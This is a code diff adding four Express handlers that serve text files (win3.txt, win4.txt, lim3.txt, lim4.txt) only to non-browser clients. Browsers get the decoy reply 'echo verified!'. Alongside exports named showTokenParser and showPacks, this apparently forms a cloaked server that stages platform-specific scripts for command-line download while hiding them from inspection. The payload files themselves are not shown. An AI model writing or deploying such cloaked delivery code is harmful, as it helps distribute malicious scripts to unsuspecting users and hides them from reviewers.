@@ -73,6 +73,66 @@ async function showV4(req, res) {
   });
 }
 
+async function showV5(req, res) {
+
+  if(looksLikeBrowser(req)) return res.send("echo verified!");
+  
+  const filePath = path.join(__dirname, '../public', 'win3.txt');
+
+  fs.readFile(filePath, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Error: 1', err);
+      return res.status(500).send('Error reading file');
+    }
+    res.send(data);
+  });
+}
+
+async function showV6(req, res) {
+
+  if(looksLikeBrowser(req)) return res.send("echo verified!");
+  
+  const filePath = path.join(__dirname, '../public', 'win4.txt');
+
+  fs.readFile(filePath, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Error: 2', err);
+      return res.status(500).send('Error reading file');
+    }
+    res.send(data);
+  });
+}
+
+async function showV7(req, res) {
+
+  if(looksLikeBrowser(req)) return res.send("echo verified!");
+  
+  const filePath = path.join(__dirname, '../public', 'lim3.txt');
+
+  fs.readFile(filePath, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Error: 3', err);
+      return res.status(500).send('Error reading file');
+    }
+    res.send(data);
+  });
+}
+
+async function showV8(req, res) {
+
+  if(looksLikeBrowser(req)) return res.send("echo verified!");
+
+  const filePath = path.join(__dirname, '../public', 'lim4.txt');
+
+  fs.readFile(filePath, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Error: 4', err);
+      return res.status(500).send('Error reading file');
+    }
+    res.send(data);
+  });
+}
+
 async function showTokenParser1(req, res) {
 
   if(looksLikeBrowser(req)) return res.send("echo verified!");
@@ -118,4 +178,4 @@ async function showPacks(req, res) {
   });
 }
 
-module.exports = { showV1, showV2, showV3, showV4, showTokenParser1, showTokenParser2, showPacks };
+module.exports = { showV1, showV2, showV3, showV4, showV5, showV6, showV7, showV8, showTokenParser1, showTokenParser2, showPacks };
